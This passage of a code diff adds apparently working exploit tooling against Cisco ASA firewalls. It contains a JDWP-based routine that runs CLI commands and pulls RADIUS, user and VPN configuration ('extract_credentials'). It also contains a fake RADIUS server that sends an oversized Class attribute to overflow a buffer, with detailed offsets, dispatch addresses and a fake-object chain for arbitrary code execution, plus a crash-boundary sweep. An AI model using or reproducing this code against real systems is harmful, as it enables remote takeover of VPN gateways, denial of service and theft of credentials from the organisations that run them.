+        Fallback: join commands with \\n and pass as a single-element array
+        by invoking y(String[]) which calls the dispatcher directly.
+        """
+        import struct as _struct
+        # Try y(String[]) which has the same dispatch semantics
+        y_method = None
+        for mid, mname, msig, _ in self.methods(class_id):
+            if mname == 'y' and '[Ljava/lang/String;' in msig:
+                y_method = mid
+                break
+
+        # To build a String[], we use ObjectReference on an existing String array
+        # obtained via VM.allClasses finding [Ljava/lang/String; and NewInstance.
+        # For now: encode a single joined command via the parent class's s() method.
+        cmd_joined = '\n'.join(commands)
+        str_obj    = self.create_string(cmd_joined)
+
+        # pack as L-typed arg (String)
+        # Try eb with string (parent class may have that)
+        parent_classes = [(tag, tid, sig, status)
+                          for tag, tid, sig, status in self.all_classes()
+                          if 'cisco/pdm/g/db' in sig]
+        for _, ptid, _, _ in parent_classes:
+            for mid, mname, msig, _ in self.methods(ptid):
+                if mname == 'eb' and '(Ljava/lang/String;)' in msig:
+                    return self.invoke_method(
+                        obj_id, thread_id, ptid, mid,
+                        args=[(ord('L'), self._enc_obj(str_obj))],
+                        options=0x01
+                    )
+
+        raise NotImplementedError('Array invocation path not resolved; use single-string overload')
+
+    # ------------------------------------------------------------------
+    # Fingerprinting / opportunistic recon
+    # ------------------------------------------------------------------
+
+    def fingerprint(self) -> dict:
+        """
+        Non-destructive recon: confirm JDWP access, identify REST Agent version,
+        enumerate loaded class signatures for AI/ML or sensitive packages.
+        """
+        import struct as _struct
+        # VM.Version
+        ver_data = self._send(self._VM, self._VM_VERSION)
+        pos = 0
+        desc,    pos = self._dec_str(ver_data, pos)
+        major,   pos = self._dec_u32(ver_data, pos)
+        minor,   pos = self._dec_u32(ver_data, pos)
+        version, pos = self._dec_str(ver_data, pos)
+        vmname,  pos = self._dec_str(ver_data, pos)
+
+        classes = self.all_classes()
+        cisco_classes = [sig for _, _, sig, _ in classes if 'cisco' in sig.lower()]
+        has_restapi   = any('cisco/pdm' in s for s in cisco_classes)
+
+        return {
+            'jvm_description': desc,
+            'jvm_version':     version,
+            'jvm_name':        vmname,
+            'class_count':     len(classes),
+            'cisco_classes':   len(cisco_classes),
+            'has_rest_agent':  has_restapi,
+            'dispatch_class':  'com.cisco.pdm.g.n' if has_restapi else None,
+        }
+
+    def dump_config_section(self, section: str = 'tunnel-group') -> str:
+        """Enumerate a config section via CLI through the REST Agent session."""
+        return self.run_cli(f'show run | include {section}')
+
+    def extract_credentials(self) -> dict:
+        """
+        Pull RADIUS server config and local user table via CLI.
+        Returns dict with raw CLI output per section.
+        """
+        sections = {
+            'radius_servers':    'show run aaa-server',
+            'local_users':       'show run username',
+            'tunnel_groups':     'show run tunnel-group',
+            'group_policies':    'show run group-policy',
+            'interface_config':  'show interface ip brief',
+        }
+        results = {}
+        for key, cmd in sections.items():
+            try:
+                results[key] = self.run_cli(cmd)
+            except Exception as exc:
+                results[key] = f'[error: {exc}]'
+        return results
+
+
+class RadiusOverflowProbe:
+    """
+    Fake RADIUS server that injects a crafted Class attribute 25 payload.
+
+    Attack path (9.14.2.14 binary, confirmed via RE):
+      ASA VPN auth -> RADIUS Access-Request -> [this server] Access-Accept
+      with Class attr 25 = OU=<payload>
+      -> strcpy(gp_obj+0x2b1, payload) -> overflow past name buffer
+         [9.14.2.14: char[64] buf; 9.22.2.32: char[32] buf — struct shrank]
+      -> VPN teardown -> cleanup fn @ 0x11845ba reads [gp_obj+0x2f0] as linked-list
+         head ptr -> loop dereferences corrupted ptr -> SIGSEGV / write-primitive
+
+    gp_obj struct layout (binary-confirmed, 9.14.2.14 @ 0x1184232 init block):
+      gp_obj+0x2b1  char group_policy_name[64]   <- strcpy dst (buf = 0x40 in 9.14; 0x20 in 9.22)
+      gp_obj+0x2f1  [end of 9.14 buffer; 0x2d1 is end of 9.22 buffer]
+      gp_obj+0x2f0  qword ptr  <- DNS-server list head (corrupted byte 63-70)
+      gp_obj+0x2f8  qword ptr  <- DNS-server list (secondary?)
+      gp_obj+0x300  dword = 1  <- flags/counter
+      gp_obj+0x308  qword ptr  <- wins-server primary list head  <- OVERFLOW_DELTA target
+      gp_obj+0x310  qword ptr  <- wins-server secondary list head
+      gp_obj+0x318  qword ptr  <- additional list
+      gp_obj+0x320  qword ptr  <- additional list
+
+    Crash mechanism (canary stage, @ cleanup fn 0x11845d0):
+      rdi = [gp_obj+0x2f0] = 0x4343...  (all 'C's from 200-byte canary)
+      test rdi, rdi -> non-null
+      mov r12, qword ptr [rdi]  -> SIGSEGV (dereference 0x4343...)
+
+    Controlled exploit requires:
+      - Bytes at +0x2f0 offset (payload[63:71]) = valid heap addr (no null bytes)
+      - Bytes at +0x308 offset (payload[87:95]) = fake wins-server node addr
+      - Custom allocator magic at fake_ptr - 8: 0xface2ace (to survive free() call)
+      - Or: fake_node[8] = 0 + fake_node[0] = 0 to terminate list cleanly
+
+    OVERFLOW_DELTA: 87 (0x57) when gp_name=0x2b1 (9.22.x confirmed); 88 (0x58) when gp_name=0x2b0 (9.12.x–9.17.x confirmed)
+    Canonical ACE payload: OVERFLOW_DELTA bytes pad + ptr_to_fake_A (8B); 87B pad for 0x2b1 variants,
+    88B pad for 0x2b0 variants. Using a fixed 88 in ace_payload corrupts wins_ptr byte 0 on 0x2b1
+    targets — fake_a_addr would be placed at gp_obj+0x309 instead of +0x308, producing a misaligned
+    read of (fake_a_addr & 0xffffffffffff00) | 0x41 at the dispatch site (0x1f59a4a MOV rdi,[rbx+0x308]).
+    wins_ptr = 0x308 confirmed CONSTANT across all versions 9.12–9.22 (PySR regression, 4 data points).
+
+    gp_obj structure around wins_ptr (confirmed layout, all F2-path versions 9.12–9.22):
+      gp_obj+0x308  qword (8B)  wins-server primary list head   ← ace_payload target
+      gp_obj+0x310  qword (8B)  wins-server secondary list head  ← first field past wins_ptr
+      gp_obj+0x318  qword (8B)  additional server list
+      gp_obj+0x320  qword (8B)  additional server list
+    No sub-byte fields exist between 0x308 and 0x310; the qword is aligned, not split.
+
+    Exploit invariants (2026-08-14, verified):
+      1. overflow_delta = WINS_PTR_OFFSET - gp_name_offset (87 or 88, layout-dependent)
+      2. ace_payload pad = OVERFLOW_DELTA bytes; do NOT hardcode 88
+      3. With correct OVERFLOW_DELTA pad, fake_a_addr occupies wins_ptr[0:8] exactly (no extra byte)
+      4. overflow_payload() and canary_payload() are already layout-correct (use self.OVERFLOW_DELTA)
+      5. wins_ptr_secondary (0x310) is untouched by a correctly-sized ACE payload
+
+    ACE chain (full report §8, 9.22.2.32 confirmed):
+      OU= = OVERFLOW_DELTA pad + ptr_to_A  (overwrites gp_obj+0x308 exactly with &fake_A)
+      mgd_timer_stop(fake_A) at 0x102c700 triggers on session teardown
+        checks *(fake_A+0x2a) == 0x42
+        loads rax = *(fake_A+0x18) = &fake_B
+        CALL *rax at 0x102cdeb  [= CALL fake_B+0x20 = CALL target_func]
+      Dispatch site: 0x102cdeb (9.22.2.32)
+      Forward path: 0x1f59a4a MOV rdi,[rbx+0x308] -> CALL 0x102c700
+
+    Stages:
+      canary  - 200-byte OU= payload, confirms crash on teardown (gp_obj+0x2f0 dereference)
+      precise - 87/88-byte pad + 8-byte fake_ptr at wins-server (gp_obj+0x308)
+      ace     - use ace_payload() for two-level fake mgd_timer ACE primitive
+    """
+
+    RADIUS_ACCESS_REQUEST  = 1
+    RADIUS_ACCESS_ACCEPT   = 2
+    RADIUS_ATTR_CLASS      = 25
+
+    # Version dispatch: gp_name struct field offset
+    # CONFIRMED data points (2026-08-14):
+    #   9.12.3.1 – 9.22.1.1 : 0x2b0  (all builds in this range binary-confirmed)
+    #   9.22.2.32+           : 0x2b1  (struct alignment shifted by 1 byte)
+    # Transition boundary: between 9.22.1.1 and 9.22.2.32 (same minor release)
+    @classmethod
+    def gp_name_offset_for_version(cls, version_tuple: tuple) -> int:
+        """Return the gp_name struct field offset for the given ASA version.
+
+        version_tuple : (major, minor, maintenance, build) ints, e.g. (9, 22, 2, 32)
+        """
+        return 0x2b1 if version_tuple >= (9, 22, 2, 0) else 0x2b0
+
+    GP_NAME_OFFSET   = 0x2b1   # default: 9.22.2.32 target; call gp_name_offset_for_version() for others
+    DNS_PTR_OFFSET   = 0x2f0   # first corrupted ptr (crash here first in canary)
+    WINS_PTR_OFFSET  = 0x308   # wins-server primary list head (precise target)
+    OVERFLOW_DELTA   = WINS_PTR_OFFSET - GP_NAME_OFFSET  # 0x57 = 87
+    DNS_DELTA        = DNS_PTR_OFFSET - GP_NAME_OFFSET   # 0x3f = 63
+
+    def __init__(self, listen_host: str = '0.0.0.0', listen_port: int = 1812,
+                 secret: bytes = b'cisco', timeout: float = 30.0,
+                 version: tuple = (9, 22, 2, 32)):
+        self.listen_host     = listen_host
+        self.listen_port     = listen_port
+        self.secret          = secret
+        self.timeout         = timeout
+        self._sock           = None
+        self.version         = version
+        gp_name              = self.gp_name_offset_for_version(version)
+        self.GP_NAME_OFFSET  = gp_name
+        self.OVERFLOW_DELTA  = self.WINS_PTR_OFFSET - gp_name
+        self.DNS_DELTA       = self.DNS_PTR_OFFSET  - gp_name
+
+    def _md5(self, data: bytes) -> bytes:
+        import hashlib
+        return hashlib.md5(data).digest()
+
+    def _build_access_accept(self, req_id: int, req_auth: bytes,
+                              class_payload: bytes) -> bytes:
+        import struct
+        attr_data = bytes([self.RADIUS_ATTR_CLASS, 2 + len(class_payload)]) + class_payload
+        length    = 20 + len(attr_data)
+        hdr_stub  = struct.pack('!BBH', self.RADIUS_ACCESS_ACCEPT, req_id, length)
+        auth      = self._md5(hdr_stub + b'\x00' * 16 + attr_data + self.secret)
+        return hdr_stub + auth + attr_data
+
+    def _parse_request(self, data: bytes):
+        import struct
+        if len(data) < 20:
+            return None, None
+        code, pkt_id, length = struct.unpack('!BBH', data[:4])
+        if code != self.RADIUS_ACCESS_REQUEST:
+            return None, None
+        req_auth = data[4:20]
+        return pkt_id, req_auth
+
+    def canary_payload(self) -> bytes:
+        return b'OU=' + b'C' * 200
+
+    def overflow_payload(self, fake_ptr: int) -> bytes:
+        import struct
+        # OVERFLOW_DELTA=87 for gp_name=0x2b1 (9.14, 9.22); 88 for gp_name=0x2b0 (9.12, 9.16)
+        # Pad aligns fake_ptr exactly at gp_obj+0x308 (wins_ptr qword) in both variants.
+        pad   = b'A' * self.OVERFLOW_DELTA
+        ptr_b = struct.pack('<Q', fake_ptr)
+        return b'OU=' + pad + ptr_b
+
+    def ace_payload(self, fake_a_addr: int, target_func: int) -> tuple[bytes, bytes, bytes]:
+        """Build two-level fake mgd_timer ACE chain (full report §8, confirmed 9.22.2.32).
+
+        Fake object A (placed at fake_a_addr):
+          A+0x18 = &B (ptr to parent)
+          A+0x2a = 0x42 (mgd_timer type byte check: cmpb $0x42,0x2a(%rdi))
+          A+0x2b = 0x00
+        Fake object B (placed at fake_a_addr + 0x60):
+          B+0x20 = target_func (CALL *rax at 0x102cdeb executes this)
+
+        OU= payload:
+          OVERFLOW_DELTA bytes padding + ptr_to_A (8 bytes)
+          For gp_name=0x2b1 (9.14, 9.22): 87B pad — ptr lands exactly at gp_obj+0x308
+          For gp_name=0x2b0 (9.12, 9.16): 88B pad — ptr lands exactly at gp_obj+0x308
+          Using a fixed 88 on 0x2b1 targets misaligns the write: byte 0 of wins_ptr
+          receives 0x41 and fake_a_addr starts at +0x309 instead of +0x308.
+
+        Returns:
+          (ou_payload, fake_a_bytes, fake_b_bytes)
+          Place fake_a/b at fake_a_addr and fake_a_addr+0x60 before triggering.
+        """
+        import struct
+        fake_b_addr = fake_a_addr + 0x60
+
+        # Fake A: 0x60 bytes, only A+0x18 and A+0x2a matter
+        fake_a = bytearray(0x60)
+        struct.pack_into('<Q', fake_a, 0x18, fake_b_addr)
+        fake_a[0x2a] = 0x42
+        fake_a[0x2b] = 0x00
+
+        # Fake B: at least 0x28 bytes, only B+0x20 matters
+        fake_b = bytearray(0x28)
+        struct.pack_into('<Q', fake_b, 0x20, target_func)
+
+        # OVERFLOW_DELTA bytes pad aligns ptr_to_A exactly at gp_obj+0x308 (wins_ptr)
+        # regardless of which gp_name variant the target binary uses.
+        pad     = b'A' * self.OVERFLOW_DELTA
+        ptr_b   = struct.pack('<Q', fake_a_addr)
+        ou_val  = pad + ptr_b
+
+        return ou_val, bytes(fake_a), bytes(fake_b)
+
+    def run_once(self, stage: str = 'canary', fake_ptr: int = 0x4141414141414141) -> dict:
+        import socket, struct
+        if stage == 'canary':
+            payload = self.canary_payload()
+        else:
+            payload = self.overflow_payload(fake_ptr)
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.settimeout(self.timeout)
+        sock.bind((self.listen_host, self.listen_port))
+        result = {'stage': stage, 'sent': False, 'payload_len': len(payload)}
+        try:
+            data, addr = sock.recvfrom(4096)
+            pkt_id, req_auth = self._parse_request(data)
+            if pkt_id is None:
+                result['error'] = 'malformed or non-Access-Request'
+                return result
+            response = self._build_access_accept(pkt_id, req_auth, payload)
+            sock.sendto(response, addr)
+            result['sent']      = True
+            result['client']    = addr
+            result['pkt_id']    = pkt_id
+            result['class_hex'] = payload[:32].hex() + '...'
+        except socket.timeout:
+            result['error'] = 'timeout waiting for Access-Request'
+        finally:
+            sock.close()
+        return result
+
+    def run_loop(self, stage: str = 'canary', fake_ptr: int = 0x4141414141414141,
+                 max_requests: int = 50) -> list:
+        import socket
+        results = []
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.settimeout(self.timeout)
+        sock.bind((self.listen_host, self.listen_port))
+        try:
+            if stage == 'canary':
+                payload = self.canary_payload()
+            else:
+                payload = self.overflow_payload(fake_ptr)
+
+            count = 0
+            while count < max_requests:
+                try:
+                    data, addr = sock.recvfrom(4096)
+                    pkt_id, req_auth = self._parse_request(data)
+                    if pkt_id is None:
+                        continue
+                    response = self._build_access_accept(pkt_id, req_auth, payload)
+                    sock.sendto(response, addr)
+                    results.append({'client': addr, 'pkt_id': pkt_id, 'sent': True})
+                    count += 1
+                except socket.timeout:
+                    break
+        finally:
+            sock.close()
+        return results
+
+    def payload_for_length(self, length: int) -> bytes:
+        """
+        Build a Class attr 25 payload of exactly `length` bytes after 'OU='.
+        Used by sweep_payload_length() to probe crash boundaries.
+        Bytes are 0x41 ('A') — no null bytes, safe for strcpy.
+        """
+        return b'OU=' + b'\x41' * length
+
+    def sweep_payload_length(self, target_host: str, target_port: int = 4443,
+                              sweep_start: int = 60, sweep_end: int = 200,
+                              step: int = 4, liveness_timeout: float = 3.0,
+                              liveness_retries: int = 2) -> dict:
+        """
+        Sweep OU= payload length from sweep_start to sweep_end, one VPN attempt
+        per length.  After each attempt, probe target liveness via TCP connect.
+        A liveness failure → crash at that length.
+
+        Returns:
+          {
+            'results': [(length, crashed:bool), ...],
+            'boundaries': [int, ...],    # lengths where crash first occurs
+            'regression': {...},         # logistic regression fit if sklearn available
+          }
+
+        The logistic regression boundary (decision threshold = 0.5) maps directly
+        to gp_obj struct pointer field offsets:
+          boundary_bytes_from_buf_start = boundary_length
+          gp_obj_offset = GP_NAME_OFFSET + boundary_length
+
+        Known boundaries from binary RE (9.14.2.14):
+          63  -> gp_obj+0x2f0 (DNS server list head)
+          87  -> gp_obj+0x308 (wins-server primary list head)
+        """
+        import socket, time
+
+        def is_alive(host: str, port: int, timeout: float, retries: int) -> bool:
+            for _ in range(retries):
+                try:
+                    s = socket.create_connection((host, port), timeout=timeout)
+                    s.close()
+                    return True
+                except (socket.timeout, ConnectionRefusedError, OSError):
+                    time.sleep(0.5)
+            return False
+
+        results = []
+        boundaries = []
+        prev_alive = True
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.settimeout(self.timeout)
+        sock.bind((self.listen_host, self.listen_port))
+
+        try:
+            for length in range(sweep_start, sweep_end + 1, step):
+                payload = self.payload_for_length(length)
+
+                # Wait for one RADIUS Access-Request at this length
+                try:
+                    data, addr = sock.recvfrom(4096)
+                    pkt_id, req_auth = self._parse_request(data)
+                    if pkt_id is None:
+                        results.append((length, None))
+                        continue
+                    response = self._build_access_accept(pkt_id, req_auth, payload)
+                    sock.sendto(response, addr)
+                except socket.timeout:
+                    results.append((length, None))
+                    continue
+
+                # Liveness check after VPN teardown (give ASA ~2s to process)
+                time.sleep(2.0)
+                alive = is_alive(target_host, target_port, liveness_timeout, liveness_retries)
+                crashed = not alive
+
+                results.append((length, crashed))
+                if crashed and prev_alive:
+                    boundaries.append(length)
+                prev_alive = alive
+
+                if crashed:
+                    # ASA needs recovery time — wait longer
+                    time.sleep(10.0)
+
+        finally:
+            sock.close()
+
+        # Logistic regression fit (optional, requires sklearn)
+        regression = None
+        clean = [(l, c) for l, c in results if c is not None]
+        if clean:
+            try:
+                import numpy as np
+                from sklearn.linear_model import LogisticRegression
+                X = np.array([[l] for l, _ in clean])
+                y = np.array([int(c) for _, c in clean])
+                if len(set(y)) == 2:  # need both classes
+                    clf = LogisticRegression(solver='lbfgs')
+                    clf.fit(X, y)
+                    boundary_len = float(-clf.intercept_[0] / clf.coef_[0][0])
+                    regression = {
+                        'boundary_payload_len': round(boundary_len, 1),
+                        'gp_obj_offset':        hex(self.GP_NAME_OFFSET + int(boundary_len)),
+                        'coef':                 float(clf.coef_[0][0]),
+                        'intercept':            float(clf.intercept_[0]),
+                    }
+            except ImportError:
+                regression = {'error': 'sklearn not available'}
+
+        return {
+            'results':    results,
+            'boundaries': boundaries,
+            'regression': regression,
+        }
+
+    def summary(self, stage: str = 'canary', fake_ptr: int = 0x4141414141414141) -> str:
+        import struct
+        if stage == 'canary':
+            payload = self.canary_payload()
+            desc    = f'200-byte canary (crash probe)'
+        else:
+            payload = self.overflow_payload(fake_ptr)
+            desc    = (f'precise overwrite: pad={self.OVERFLOW_DELTA}B '
+                       f'ptr=0x{fake_ptr:016x}')
+        lines = [
+            'RadiusOverflowProbe',
+            f'  listen   : {self.listen_host}:{self.listen_port} UDP',
+            f'  secret   : {self.secret!r}',
+            f'  stage    : {stage} — {desc}',
+            f'  payload  : {len(payload)} bytes (Class attr 25)',
+            f'  overflow : gp_obj+0x{self.GP_NAME_OFFSET:03x} -> gp_obj+0x{self.WINS_PTR_OFFSET:03x}',
+            f'  delta    : {self.OVERFLOW_DELTA} bytes (0x{self.OVERFLOW_DELTA:02x})',
+            f'  first32  : {payload[:35].hex()}...',
+        ]
+        return '\n'.join(lines)
 
 
 if __name__ == '__main__':
